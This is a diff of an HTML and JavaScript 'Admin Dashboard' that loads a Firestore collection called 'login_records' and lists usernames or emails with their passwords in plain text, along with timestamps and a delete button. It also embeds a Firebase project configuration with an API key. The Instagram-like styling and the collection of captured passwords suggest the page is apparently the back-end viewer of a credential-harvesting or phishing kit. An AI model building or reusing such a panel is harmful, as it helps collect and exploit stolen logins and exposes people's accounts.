@@ -1,356 +1,248 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Users · Admin Dashboard</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard</title>
 
-    <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
 
-        body {
-            background: #f0f2f5;
-            font-family: 'Inter', Arial, sans-serif;
-            font-size: 14px;
-            color: #262626;
-            min-height: 100vh;
-            padding: 32px 20px;
-        }
+<style>
 
-        /* ── Header ── */
-        .header {
-            max-width: 900px;
-            margin: 0 auto 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
+body{
+font-family:Inter;
+background:#f2f2f2;
+padding:40px;
+}
 
-        .header h1 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #262626;
-        }
+.card{
+background:white;
+max-width:900px;
+margin:auto;
+border-radius:10px;
+overflow:hidden;
+border:1px solid #ddd;
+}
 
-        .header h1 span {
-            font-size: 13px;
-            font-weight: 500;
-            color: #8e8e8e;
-            margin-left: 10px;
-        }
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:20px;
+}
 
-        .btn-refresh {
-            padding: 8px 18px;
-            background: #0095f6;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
+button{
+background:#0095f6;
+color:white;
+border:none;
+padding:8px 16px;
+border-radius:6px;
+cursor:pointer;
+}
 
-        .btn-refresh:hover { background: #1877f2; }
-        .btn-refresh:disabled { opacity: 0.6; cursor: not-allowed; }
+table{
+width:100%;
+border-collapse:collapse;
+}
 
-        /* ── Card ── */
-        .card {
-            max-width: 900px;
-            margin: 0 auto;
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 12px;
-            overflow: hidden;
-        }
+th{
+text-align:left;
+padding:14px;
+font-size:12px;
+color:#666;
+border-bottom:1px solid #eee;
+}
 
-        /* ── Table ── */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
+td{
+padding:14px;
+border-bottom:1px solid #eee;
+font-size:13px;
+}
 
-        thead {
-            background: #fafafa;
-            border-bottom: 1px solid #dbdbdb;
-        }
+.delete{
+background:#ed4956;
+}
 
-        thead th {
-            padding: 14px 18px;
-            text-align: left;
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.6px;
-            color: #8e8e8e;
-        }
+.empty{
+text-align:center;
+padding:40px;
+color:#888;
+}
 
-        tbody tr {
-            border-bottom: 1px solid #efefef;
-            transition: background 0.15s;
-        }
-
-        tbody tr:last-child { border-bottom: none; }
-        tbody tr:hover { background: #fafafa; }
-
-        tbody td {
-            padding: 14px 18px;
-            font-size: 13px;
-            color: #262626;
-            vertical-align: middle;
-        }
-
-        .badge-id {
-            font-family: monospace;
-            font-size: 11px;
-            background: #f0f2f5;
-            padding: 3px 8px;
-            border-radius: 4px;
-            color: #555;
-        }
-
-        .password-cell {
-            font-family: monospace;
-            letter-spacing: 2px;
-            color: #8e8e8e;
-        }
-
-        .timestamp-cell { color: #8e8e8e; font-size: 12px; }
-
-        .btn-delete {
-            padding: 5px 12px;
-            background: transparent;
-            border: 1px solid #ed4956;
-            color: #ed4956;
-            border-radius: 6px;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.15s, color 0.15s;
-        }
-
-        .btn-delete:hover { background: #ed4956; color: #fff; }
-
-        /* ── Empty / Loading state ── */
-        .state-row td {
-            text-align: center;
-            padding: 48px;
-            color: #8e8e8e;
-            font-size: 14px;
-        }
-
-        .spinner-inline {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #dbdbdb;
-            border-top-color: #0095f6;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* ── Record count ── */
-        .footer-bar {
-            max-width: 900px;
-            margin: 14px auto 0;
-            font-size: 12px;
-            color: #8e8e8e;
-            text-align: right;
-        }
-
-        /* ── Responsive ── */
-        @media (max-width: 600px) {
-            thead th:nth-child(1),
-            tbody td:nth-child(1) { display: none; }
-
-            .password-cell { letter-spacing: 1px; }
-        }
-    </style>
+</style>
 </head>
 
 <body>
 
-    <!-- Header -->
-    <div class="header">
-        <h1>Login Records <span id="countLabel"></span></h1>
-        <button class="btn-refresh" id="refreshBtn" onclick="loadRecords()">
-            ↻ Refresh
-        </button>
-    </div>
+<div class="header">
+<h2>Login Records <span id="count"></span></h2>
+<button onclick="loadRecords()">Refresh</button>
+</div>
 
-    <!-- Table Card -->
-    <div class="card">
-        <table>
-            <thead>
-                <tr>
-                    <th>#&nbsp;Doc ID</th>
-                    <th>Username / Email</th>
-                    <th>Password</th>
-                    <th>Timestamp</th>
-                    <th></th>
-                </tr>
-            </thead>
-            <tbody id="tableBody">
-                <tr class="state-row">
-                    <td colspan="5">
-                        <span class="spinner-inline"></span> Loading records…
-                    </td>
-                </tr>
-            </tbody>
-        </table>
-    </div>
+<div class="card">
+<table>
 
-    <div class="footer-bar" id="footerBar"></div>
+<thead>
+<tr>
+<th>ID</th>
+<th>Email</th>
+<th>Password</th>
+<th>Time</th>
+<th></th>
+</tr>
+</thead>
 
-    <!-- Firebase -->
-    <script type="module">
-        import { initializeApp }   from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
-        import {
-            getFirestore,
-            collection,
-            getDocs,
-            deleteDoc,
-            doc,
-            orderBy,
-            query
-        } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
+<tbody id="tableBody">
 
-        const firebaseConfig = {
-            apiKey:            "AIzaSyAy0k5QdtA65i4r9H7G8MptYn1JgtcsxKo",
-            authDomain:        "visionova-f2220.firebaseapp.com",
-            databaseURL:       "https://visionova-f2220-default-rtdb.europe-west1.firebasedatabase.app",
-            projectId:         "visionova-f2220",
-            storageBucket:     "visionova-f2220.firebasestorage.app",
-            messagingSenderId: "416012396580",
-            appId:             "1:416012396580:web:54697d33c1b02516d4d0b1",
-            measurementId:     "G-WSC3GNPP24"
-        };
+<tr class="empty">
+<td colspan="5">Loading...</td>
+</tr>
 
-        const app = initializeApp(firebaseConfig);
-        const db  = getFirestore(app);
+</tbody>
 
-        // ── Format timestamp ─────────────────────────────────
-        function formatDate(ts) {
-            if (!ts) return '—';
-            const d = ts.toDate ? ts.toDate() : new Date(ts);
-            return d.toLocaleString('en-IN', {
-                day:    '2-digit',
-                month:  'short',
-                year:   'numeric',
-                hour:   '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
-        }
+</table>
+</div>
 
-        // ── Mask password ─────────────────────────────────────
-        function maskPassword(pw) {
-            if (!pw) return '—';
-            return pw[0] + '●'.repeat(Math.min(pw.length - 1, 8));
-        }
+<script type="module">
 
-        // ── Load records ──────────────────────────────────────
-        window.loadRecords = async function () {
-            const tbody     = document.getElementById('tableBody');
-            const countLbl  = document.getElementById('countLabel');
-            const footerBar = document.getElementById('footerBar');
-            const btn       = document.getElementById('refreshBtn');
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
 
-            btn.disabled = true;
-            tbody.innerHTML = `<tr class="state-row"><td colspan="5">
-                <span class="spinner-inline"></span> Loading records…</td></tr>`;
+import {
+getFirestore,
+collection,
+getDocs,
+deleteDoc,
+doc,
+query,
+orderBy
+} from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
 
-            try {
-                const q       = query(collection(db, 'login_records'), orderBy('timestamp', 'desc'));
-                const snapshot = await getDocs(q);
+const firebaseConfig = {
 
-                if (snapshot.empty) {
-                    tbody.innerHTML = `<tr class="state-row"><td colspan="5">No records found yet.</td></tr>`;
-                    countLbl.textContent = '';
-                    footerBar.textContent = '';
-                    return;
-                }
+apiKey:"AIzaSyAy0k5QdtA65i4r9H7G8MptYn1JgtcsxKo",
+authDomain:"visionova-f2220.firebaseapp.com",
+projectId:"visionova-f2220",
+storageBucket:"visionova-f2220.firebasestorage.app",
+messagingSenderId:"416012396580",
+appId:"1:416012396580:web:54697d33c1b02516d4d0b1"
 
-                const rows = [];
-                snapshot.forEach(docSnap => {
-                    const d = docSnap.data();
-                    rows.push(`
-                        <tr>
-                            <td><span class="badge-id">${docSnap.id.slice(0, 10)}…</span></td>
-                            <td>${escHtml(d.username ?? '—')}</td>
-                            <td class="password-cell">${escHtml(d.password ?? '—')}</td>
-                            <td class="timestamp-cell">${formatDate(d.timestamp)}</td>
-                            <td>
-                                <button class="btn-delete"
-                                    onclick="deleteRecord('${docSnap.id}', this)">
-                                    Delete
-                                </button>
-                            </td>
-                        </tr>`);
-                });
+};
 
-                tbody.innerHTML = rows.join('');
-                const total = snapshot.size;
-                countLbl.textContent  = `(${total} record${total !== 1 ? 's' : ''})`;
-                footerBar.textContent = `Last fetched: ${new Date().toLocaleTimeString()}`;
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-            } catch (err) {
-                console.error(err);
-                tbody.innerHTML = `<tr class="state-row"><td colspan="5">
-                    ⚠️ Error loading data. Check Firestore rules or config.</td></tr>`;
-            } finally {
-                btn.disabled = false;
-            }
-        };
+function formatDate(ts){
 
-        // ── Delete a record ───────────────────────────────────
-        window.deleteRecord = async function (id, btnEl) {
-            if (!confirm('Delete this record?')) return;
-            btnEl.disabled   = true;
-            btnEl.textContent = '…';
-            try {
-                await deleteDoc(doc(db, 'login_records', id));
-                btnEl.closest('tr').remove();
-                // Update count
-                const tbody    = document.getElementById('tableBody');
-                const remaining = tbody.querySelectorAll('tr:not(.state-row)').length;
-                document.getElementById('countLabel').textContent =
-                    remaining ? `(${remaining} record${remaining !== 1 ? 's' : ''})` : '';
-                if (!remaining) {
-                    tbody.innerHTML = `<tr class="state-row"><td colspan="5">No records found yet.</td></tr>`;
-                }
-            } catch (err) {
-                console.error(err);
-                alert('Failed to delete. Check Firestore rules.');
-                btnEl.disabled   = false;
-                btnEl.textContent = 'Delete';
-            }
-        };
+if(!ts) return "-";
 
-        // ── Escape HTML ───────────────────────────────────────
-        function escHtml(str) {
-            return String(str)
-                .replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;')
-                .replace(/"/g, '&quot;');
-        }
+const d = ts.toDate ? ts.toDate() : new Date(ts);
 
-        // Initial load
-        loadRecords();
-    </script>
+return d.toLocaleString();
+
+}
+
+function escapeHTML(str){
+
+return String(str)
+.replace(/&/g,"&amp;")
+.replace(/</g,"&lt;")
+.replace(/>/g,"&gt;")
+.replace(/"/g,"&quot;")
+
+}
+
+window.loadRecords = async function(){
+
+const tbody=document.getElementById("tableBody");
+const count=document.getElementById("count");
+
+tbody.innerHTML=`<tr class="empty"><td colspan="5">Loading...</td></tr>`;
+
+try{
+
+const q=query(
+collection(db,"login_records"),
+orderBy("timestamp","desc")
+);
+
+const snap=await getDocs(q);
+
+if(snap.empty){
+
+tbody.innerHTML=`<tr class="empty"><td colspan="5">No Records</td></tr>`;
+count.innerText="";
+return;
+
+}
+
+let html="";
+
+snap.forEach(docSnap=>{
+
+const d=docSnap.data();
+
+html+=`
+<tr>
+
+<td>${docSnap.id.slice(0,8)}</td>
+
+<td>${escapeHTML(d.username||"-")}</td>
+
+<td>${escapeHTML(d.password||"-")}</td>
+
+<td>${formatDate(d.timestamp)}</td>
+
+<td>
+<button class="delete" onclick="deleteRecord('${docSnap.id}')">
+Delete
+</button>
+</td>
+
+</tr>
+`;
+
+});
+
+tbody.innerHTML=html;
+
+count.innerText=`(${snap.size})`;
+
+}catch(err){
+
+console.error(err);
+
+tbody.innerHTML=`
+<tr class="empty">
+<td colspan="5">Error loading data</td>
+</tr>`;
+
+}
+
+}
+
+window.deleteRecord = async function(id){
+
+if(!confirm("Delete record?")) return;
+
+try{
+
+await deleteDoc(doc(db,"login_records",id));
+
+loadRecords();
+
+}catch(err){
+
+alert("Delete failed");
+
+console.error(err);
+
+}
+
+}
+
+loadRecords();
+
+</script>
 
 </body>
 </html>
